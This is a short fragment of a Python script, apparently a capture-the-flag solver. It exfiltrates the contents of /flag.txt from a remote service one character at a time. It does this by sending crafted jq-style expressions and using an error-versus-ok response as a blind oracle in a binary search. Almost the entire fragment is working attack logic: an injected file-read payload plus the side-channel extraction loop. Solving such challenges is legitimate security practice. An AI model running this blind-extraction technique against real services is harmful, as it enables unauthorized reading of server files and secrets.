    r = conn.recvuntil((b"ok", b"error"))
    return b"error" in r

def get_char_at(index):
    lo, hi = 32, 126
    while lo < hi:
        mid = (lo + hi) // 2
        cond = f'(load("/flag.txt")|split("")[{index}])<=("%{hex(mid)[2:]}"|@urid)'
        expr = f'load(({{"true":"bad","false":"/flag.txt"}}[{cond}]))'
        # print(encode_payload(expr))
        if query(expr):  # error = char <= mid
            hi = mid
        else:
            lo = mid + 1
    return chr(lo)

